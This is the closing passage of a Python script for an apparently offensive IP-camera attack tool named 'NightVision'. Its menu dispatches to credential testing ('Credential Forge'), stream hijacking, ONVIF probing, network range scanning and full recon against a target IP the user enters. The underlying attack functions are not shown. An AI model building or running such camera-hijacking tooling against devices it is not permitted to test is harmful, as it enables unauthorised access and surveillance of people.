            ports, rtsp = scan_target(ip)
            if ports: find_login_pages(ip, ports)
            
        elif choice == "4":  # Credential Forge
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            ports, rtsp = scan_target(ip)
            if ports:
                brand, score, onvif = detect_camera(ip, ports)
                test_creds(ip, ports, rtsp, brand)
            
        elif choice == "5":  # Stream Hijacker
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            ports, rtsp = scan_target(ip)
            if ports: find_streams(ip, ports, rtsp)
            
        elif choice == "6":  # ONVIF Probe
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            ports, rtsp = scan_target(ip)
            if ports: onvif_probe(ip, ports)
            
        elif choice == "7":  # Network Range
            cidr = input(f"  {C}CIDR range (e.g., 192.168.1.0/24){W} > ").strip()
            network_scan(cidr)
            
        elif choice == "8":  # Full Recon
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            full_recon(ip)
            
        else:
            log(f"Invalid option: {choice}", "err")
        
        input(f"\n  {D}Press Enter to continue...{W}")

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        log(f"Invalid IP: {ip}", "err")
        return False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {R}[!] Interrupted by user{W}")
        print(f"  {M}NightVision terminated. — {DEV}{W}\n")
        sys.exit(0)
    except Exception as e:
        log(f"Fatal error: {e}", "err")
        sys.exit(1)
